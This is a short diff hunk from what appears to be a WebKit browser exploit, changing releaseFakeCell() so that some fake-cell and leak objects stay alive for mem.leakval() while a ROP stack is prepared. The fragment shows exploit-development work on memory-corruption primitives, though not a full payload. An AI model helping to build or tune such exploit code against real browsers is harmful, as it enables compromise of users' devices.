@@ -1298,20 +1298,13 @@ export function releaseFakeCell() {
     referenceTarget = null;
     keepAlive = null;
 
-    // Drop every remaining binding from the WebKit stage so prepare()'s ROP
-    // stack can allocate — partial release was causing prepare()-time OOM.
+    // Drop large WebKit debris only — keep targetHolder/markerObjectA alive
+    // because mem.leakval() still uses setLeakSlot/clearLeakSlot during prepare().
     rwBuffer = null;
     rwView = null;
     rwMirror = null;
     targetBuffer = null;
     targetView = null;
-    anchorElement = null;
-    markerObjectA = null;
-    markerObjectB = null;
-    targetHolder = null;
-    holderGuardA = null;
-    holderGuardB = null;
-    nativeTarget = null;
 
     try {
         history.replaceState(null, "");
